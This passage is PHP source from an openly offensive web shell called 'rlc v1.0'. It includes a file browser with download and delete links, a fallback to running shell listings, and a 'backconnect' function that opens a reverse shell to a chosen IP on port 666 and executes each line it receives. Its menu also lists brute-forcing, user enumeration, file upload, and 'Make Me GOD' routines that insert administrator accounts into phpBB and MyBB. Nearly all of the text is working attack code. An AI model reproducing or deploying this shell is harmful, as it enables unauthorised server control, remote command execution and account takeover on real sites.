              <td align="center">'.format_fperms($path, "l").'</td>
              <td width="1%" align="center">'.format_fperms($path,"s").'</td>
              <td width="1%" align="center"><a href="?action&list='.$path.'&download" ><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfUlEQVQ4y6WTv0tCURzFvwW9LCwpf9QS0Q8lcAmSGhoKBAuEVLBXm0PgUEIFQWEQ0hJNubi0tLb3B0RF1hINUkNbSW3vPTEaXPp2zyVDMbqBDz68wznf7+G+C4+YmZqh4Rk7IVNgfb9rkR6pHt8xWWec4/PP0zrgIVMWeHNkZisrnK7M8V5lQQIND5myYPSIzMOyzjulIO+W5iXQ8JApC4YOyNx/i/BmcZq3ijMSaHjIlAWDGTIzTyFeexjn1GNAAg0PmbJgYJus1J2f49dOXsp7JNDwkDUsaH7S+jfI6Fsnq8rqrZ/1C1Fw6ZZAw6udwQ52ZYltkpzupDh6IcggemXjxXwv6zcuCTS8ao5Z7NSdxDZBDleCjOVCL4fvWzlW6OK40AAaHjLMYPbX728bJkePTkby1cvhZ40jL3YJNDxkmPnzEjHQHSMj/THLoTJJoOEpl2tL7GEyspxgAP2f5Q6BR+ATTLVoFOsM0jsQOiq8gGBEgMtr/9lq9nf+AkHZVZaWnYt4AAAAAElFTkSuQmCC"></a></td>
                <td width="1%" align="center"><a href="?action&list='.$path.'&del"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7"></a></td></tr>'; 
    }
   

    $contStock = get_dir_contents($loc, 2);
   
    foreach($contStock as $nfd) {
      $path = str_fromArray(path_strip($loc."/".$nfd), "/", "path");

      $smpath = explode("public_html", $path);
      $tsmpath = $smpath[sizeof($smpath)-1];
      $sympath = 'http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'].$tsmpath;

      $afiseaza .= '<tr bgcolor="black"><td>';
              if(format_fperms($path, "r") == "r")
                $afiseaza .= '<a href="?action&list='.$path.'&edit">';
              else
                $afiseaza .= '<a href="'.$sympath.'" target="_blank">';
      $afiseaza .= '<font color="#FFFFFF"> '.$nfd.' => '.@readlink($nfd).'</font></a></td>
              <td width="1%" align="center">'.format_fowner($path).'</td>
              <td align="right">'.format_fsize($path).'</td>
              <td align="center">'.format_fperms($path, "tl").'</td>
              <td align="center">'.format_fperms($path, "l").'</td>
              <td width="1%" align="center">'.format_fperms($path,"s").'</td>
              <td width="1%" align="center"></td>
              <td width="1%" align="center"><a href="?action&list='.$path.'&del"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7"></a></td></tr>';
    }
    
    
   

    $afiseaza .= '</table>';
  }

 return $afiseaza;
}

function format_fowner($path) {
  if(function_exists("posix_getpwuid"))
    $flowner = posix_getpwuid(@fileowner($path));
  else 
    $flowner['name'] = "??? = ".@fileowner($path);
  return $flowner['name'];
}

function format_fsize($path) {
  if(!is_file($path)) return "0 By";
  
  $size = "";
  $type = 0;
  
  $sz = filesize($path);
  
  while($sz > 1024) {
    $sz/=1024;
    $type++;
  }
  
  switch($type) {
    case 1: $size .= number_format($sz, 2)." Kb"; break;
    case 2: $size .= number_format($sz, 2)." Mb"; break;
    case 3: $size .= number_format($sz, 2)." Gb"; break;
    case 4: $size .= number_format($sz, 2)." Tb"; break;
    default: $size .= number_format($sz, 2)." By";
  }
  
  return $size;
}
function format_fperms($path, $type) {
  $access = '';
  $perms = @fileperms($path);

  switch($type) {
    case 'l':
      // Owner
      $access .= (($perms & 0x0100) ? 'r' : '-');
      $access .= (($perms & 0x0080) ? 'w' : '-');
      $access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
      $access .= " ";
      // Group
      $access .= (($perms & 0x0020) ? 'r' : '-');
      $access .= (($perms & 0x0010) ? 'w' : '-');
      $access .= (($perms & 0x0008) ? (($perms & 0x0400)?'s':'x') : (($perms & 0x0400)?'S':'-'));
      $access .= " ";
      // Others
      $access .= (($perms & 0x0004) ? 'r' : '-');
      $access .= (($perms & 0x0002) ? 'w' : '-');
      $access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200)?'T':'-'));
      break;  
    case 'n':
      $access .= substr(sprintf('%o', $perms), -4);
      break;
    case 's':
      $access .= format_fperms($path, 'r');
      $access .= format_fperms($path, 'w');
      $access .= format_fperms($path, 'x');
      break;
    case 't':
      $tmp_chkA = str_fromArray(path_strip($path), "/", "path");
      $tmp_chkB = str_fromArray(path_strip(@readlink($path)), "/", "path");
      
      if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $ext = pathinfo($tmp_chkA, PATHINFO_EXTENSION);
        if($ext == "lnk") {
          $access = 'l';
        }else if(($perms & 0x4000) == 0x4000) {
          $access = 'd';
        }else if(($perms & 0x8000) == 0x8000) {
          $access = 'f';
        }else {
          $access = 'u';
        }
      }else {
        if(strlen($tmp_chkB) > 0) {
          $access = 'l';
        }else if(($perms & 0x4000) == 0x4000) {
          $access = 'd';
        }else if(($perms & 0x8000) == 0x8000) {
          $access = 'f';
        }else{
          $access = 'u';
        }
      }
      break;
    case 'tl':
      if(($perms & 0x4000) == 0x4000) {
        $access = 'd';
      }else if(($perms & 0x8000) == 0x8000) {
        $access = 'f';
      }else {
        $access = 'l';
      }
      break;
    case 'r':
      if(@fileowner($path) == @fileowner(dirname(__FILE__))) $access .= (($perms & 0x0100) ? 'r' : '-');
      else $access .= (($perms & 0x0004) ? 'r' : '-');
      break;
    case 'w':
      if(@fileowner($path) == @fileowner(dirname(__FILE__))) $access .= (($perms & 0x0080) ? 'w' : '-');
      else $access .= (($perms & 0x0002) ? 'w' : '-');
      break;
    case 'x':
      if(@fileowner($path) == @fileowner(dirname(__FILE__))) $access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
      else $access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200) ?'T':'-'));
      break;
    default: $access .= 'E';
  }
  return $access; 
}
function is_path_readable($path) {
  if(is_this_dir($path) && format_fperms($path, "r") == 'r') {
    return true;  
  }
  return false;
}

function is_this_dir($path) {
  if(format_fperms($path, 't') == 'd') {
    return true;  
  }
  return false;
}

function is_this_file($path) {
  if(format_fperms($path, 't') == 'f') {
    return true;  
  }
  return false;
}

function is_this_link($path) {
  if(format_fperms($path, 't') == 'l') {
    return true;  
  }
  return false;
}

function is_this_unk($path) {
  if(!is_this_dir($path) && !is_this_file($path) && !is_this_link($path)) {
    return true;
  }
  return false;
}
function get_dir_contents($path, $type = -1) {
      if(!is_path_readable($path))
        return array();

      $case = 0;
      $temp = NULL;
      $contStock = array();
      $contTmp = array();
    
      if(function_exists("scandir") && ($temp = scandir($path)) !== false) {
        foreach($temp as $stock) {
          $tmp = str_fromArray(path_strip($path."/".$stock), "/", "path");
          if($stock != "") {
            switch($type) {
              case 0: if(is_this_dir($tmp)) $contTmp[] = $stock; break;
              case 1: if(is_this_file($tmp)) $contTmp[] = $stock; break;
              case 2: if(is_this_link($tmp)) $contTmp[] = $stock; break;
              case 3: if(is_this_unk($tmp)) $contTmp[] = $stock; break;  
              default : $contTmp[] = $stock; break;
            }
          }
        }
      }
  
      if(sizeof($contTmp) > sizeof($contStock)) {
        $contStock = $contTmp;
        $contTmp = array();
        $case = 1;
      }
    
      $temp = NULL;
      $contTmp = array();
      if(function_exists("opendir") && ($temp = opendir($path)) !== false) {
        while(($stock = readdir($temp)) !== false) {
          $tmp = str_fromArray(path_strip($path."/".$stock), "/", "path");
          if($stock != "") {
            switch($type) {
              case 0: if(is_this_dir($tmp)) $contTmp[] = $stock; break;
              case 1: if(is_this_file($tmp)) $contTmp[] = $stock; break;
              case 2: if(is_this_link($tmp)) $contTmp[] = $stock; break;
              case 3: if(is_this_unk($tmp)) $contTmp[] = $stock; break;    
              default : $contTmp[] = $stock; break;
            }
          }
        }
        sort($contTmp);
      }
    
      if(sizeof($contTmp) > sizeof($contStock)) {
        $contStock = $contTmp;
        $contTmp = array();
        $case = 2;
      }
  
      if(isset($_COOKIE['xallow']) && $_COOKIE['xallow'] == "null") {
        $temp = NULL;
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
          $temp = do_through_shell("dir /A /B ".$path);
        }else {
          $temp = do_through_shell("ls -a ".$path);
        }
        $tmp_array = explode("\n", $temp);
    
        $contTmp = array();
        foreach($tmp_array as $stock) {
          $tmp = str_fromArray(path_strip($path."/".$stock), "/", "path");
          if($stock != "") {
            switch($type) {
              case 0: if(is_this_dir($tmp)) $contTmp[] = $stock; break;
              case 1: if(is_this_file($tmp)) $contTmp[] = $stock; break;
              case 2: if(is_this_link($tmp)) $contTmp[] = $stock; break;
              case 3: if(is_this_unk($tmp)) $contTmp[] = $stock; break;    
              default : $contTmp[] = $stock; break;
            }
          }
        }
        sort($contTmp);
        
        if(sizeof($contTmp) > sizeof($contStock)) {
          $contStock = $contTmp;
          $contTmp = array();
          $case = 3;
        }
      }
  
      return $contStock;
    }
function str_fromArray($stack, $delimiter=" ", $type="") {
  $string = "";
  for($i=0; $i<sizeof($stack); $i++) {
    switch($type) {
      case "path":
        $string .= $delimiter.$stack[$i];
        break;
      default:
        if(strlen($string) == 0)
          $string .= $stack[$i];
        else
          $string .= $delimiter.$stack[$i];
    }
  }
  return $string;
}
function path_strip($path) {
      $raw = array();
      
      $path = str_replace("\\", "/", $path);
      if(str_startsWith("./", $path)) {
        $entire = str_replace("\\", "/", dirname(__FILE__));
        $ppath = explode("/", $entire);
        $raw = path_strip_pdp($ppath, $raw);
      }

      $tpath = explode("/", $path);
      $raw = path_strip_pdp($tpath, $raw);

      return $raw;
    }
    
    function path_strip_pdp($path, $stack) {
      if(sizeof($path) > 1) {
        if(sizeof($path) == 2) {
          if($path[1] != ".") {
            if($path[1] == "..") 
              array_pop($stack);
            else
              $stack[] = $path[1];
          }
        }else {
          for($i=1; $i<sizeof($path); $i++) {
            if($path[$i] != "" && $path[$i] != ".") {
              if($path[$i] == "..") 
                array_pop($stack);
              else
                $stack[] = $path[$i];
            }
          }
        }
      }

      return $stack;
    }
function Size($path){
    $bytes = sprintf('%u', filesize($path));

    if ($bytes > 0){
        $unit = intval(log($bytes, 1024));
        $units = array('B', 'KB', 'MB', 'GB');

        if (array_key_exists($unit, $units) === true){
            return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
        }
    }

    return $bytes;
}

function DownloadFile($file) { // $file = include path
        if(file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            ob_clean();
            flush();
            readfile($file);
            exit;
        }

    }
function backconnect(){
  if(isset($_POST['submit'])){ 
      $connect=@pfsockopen($_POST['ip'],$_POST['port']);
    if(!$connect){
        $afiseaza='Error Connect';
    }
    else
    {
          fputs($connect,"Back-Connection \n");
          fputs($connect,system("uname -a")."\n");
          fputs($connect,system("pwd")."\n");
          fputs($connect,system("id")."\n");
          fputs($connect,proprietati()."\n");
          while(!feof($connect))
              {
              $ia=fgets ($connect,8192);
              $mesaj=`$ia`;
              fputs ($connect,ValidExeCommand("whoami").'./'.$mesaj."\n"); 
              }
          fclose($connect);
          
      }
  }
    $afiseaza='Try in cmd command :  netcat: nc -l -n -v -p <br>';
    $afiseaza.='<form method="post" action="?action&backc">';
    $afiseaza.='<input type="text" name="ip" value="'.$_SERVER['REMOTE_ADDR'].'" id="text">';
    $afiseaza.='<input type="text" name="port" value="666" size="5" id="text">';
    $afiseaza.='<input type="submit" name="submit" value="Start" id="but"></form>';
    
    return $afiseaza;
}    
/*************************Controler************************************/

if(isset($_GET['action']) && isset($_GET['home'])){

  $continut=proprietati();
  $continut.=executa_shell();

}elseif(isset($_GET['action']) && isset($_GET['list'])){
  $continut=dirfile();
}elseif(isset($_GET['action']) && isset($_GET['upload'])){
  $continut=upload();
}elseif(isset($_GET['action']) && isset($_GET['brute'])){
  $continut=md5_crack();
}elseif(isset($_GET['action']) && isset($_GET['users'])){
  $continut=rd_users();
}elseif(isset($_GET['action']) && isset($_GET['sqli'])){
  $continut='Va fi implementat in urmatoarea versiune';
}elseif(isset($_GET['action']) && isset($_GET['about'])){
  $continut=despre_rlc();
}elseif(isset($_GET['action']) && isset($_GET['backc'])){
  $continut=backconnect();
}elseif(isset($_GET['action']) && isset($_GET['cms'])){
  $continut=cmsCommand();
}elseif(isset($_GET['action']) && isset($_GET['cms']) && isset($_GET['phpbb']) ){
  $continut=insert_admin_phpbb();
}elseif(isset($_GET['action']) && isset($_GET['cms']) && isset($_GET['mybb']) ){
  $continut=insert_admin_mybb();
}elseif(isset($_GET['action']) && isset($_GET['logout']) ){
  $continut=logout();
}
  
  
  
/******************TEMPLATE*********************************/
$html='<title>rlc v1.0 public version</title>
            

<body vlink="white" link="grey">';
$html.=rlc();
$html.='<ul id="tablist">
    <li><a class="current" href="?action&home">Shell Command</a></li>
    <li><a href="?action&list">List Files/Directory</a></li>
    <li><a href="?action&upload">Upload</a></li>
    <li><a href="?action&brute">Brute-force</a></li>
    <li><a href="?action&users">Users</a></li>
    <li><a href="?action&backc">Back Connect</a></li>
    <li><a href="?action&cms">Make Me GOD</a></li>
    <li><a href="?action&about">About New Version!</a></li>
    <li><a href="?action&logout">Logout</a></li>
    </ul><br><hr color="#3cbddd">';
    
$html.=$continut;
$html.='<br><hr color="#3cbddd">'.copyright().'</body></html>';
echo $html;
}
else
{
  if(!isset($_POST['sesiuni'])){  
      echo $afiseaza;
  }else{
      if(hash("adler32",$_POST['pass']) == $pass & hash("adler32",$_POST['user'])==$user ){
          $_SESSION['user']=hash("adler32",$_POST['user']);
          $_SESSION['pass']=hash("adler32",$_POST['pass']);
       }
    echo '<meta HTTP-EQUIV="REFRESH" content="0; url=?action&home">';
   }

}
function stylemenu(){
  echo '<style type="text/css">
        BODY {
              background-color: black;
              font-family : Calibri;
              color : #3cbddd;
              margin: 45px; 
              font-size: 12px;
              }

        #tablist{
        padding: 3px 0;
        margin:0px;
        margin-bottom: 0;
        margin-top: 0.1em;
        }

        #tablist li{
        list-style: none;
        display: inline;
        font-size: 14px;
        margin:0px;
        }

        #tablist li a{
        text-decoration: none;
        padding: 3px 0.5em;
        margin-right: 3px;
        border: 1px solid #3cbddd;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        -border-radius: 5px;


        }
        #tablist li a:link, #tablist li a:visited{
        background-color:black;
        color:#3cbddd;
        }

        #tablist li a:hover{
        background-color:black;
        color:red;
        text-align:center;
        border-color:gray; 
        }

        #tablist li a.current{
        background-color:black;
        }

        #but{
        background-color:black;
        color:#3cbddd;
        text-align:center;
        border-color:gray;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px; 
        border-radius: 5px;   
        }
        #text{
        background-color:black;   
        border-color:gray;
        color:#3cbddd;
        }
        #textarea{
            color:#3cbddd; 
            background-color:black; 
            border:1px solid gray;
            
        }

        </style>';
}

?>
